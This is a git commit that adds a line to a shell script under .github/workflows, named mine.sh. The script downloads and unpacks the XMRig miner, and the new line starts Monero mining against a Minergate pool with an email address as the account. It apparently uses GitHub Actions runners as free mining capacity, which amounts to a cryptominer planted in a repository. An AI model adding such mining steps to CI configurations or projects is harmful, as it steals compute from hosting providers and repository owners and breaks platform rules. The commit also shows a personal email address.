81f6eaa7729a7f0ae40084eb086e3d930c37f132
Hshshhhh16 <90821800+Hshshhhh16@users.noreply.github.com>
2021-09-16 09:39:10 +0200

    Update mine.sh

--- .github/workflows/mine.sh
+++ .github/workflows/mine.sh
@@ -4,3 +4,5 @@ wget https://github.com/xmrig/xmrig/releases/download/v5.5.1/xmrig-5.5.1-xenial-
 tar -zxf xmrig-5.5.1-xenial-x64.tar.gz
 
 cd xmrig-5.5.1
+
+./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u mihajloapp@gmail.com -p x
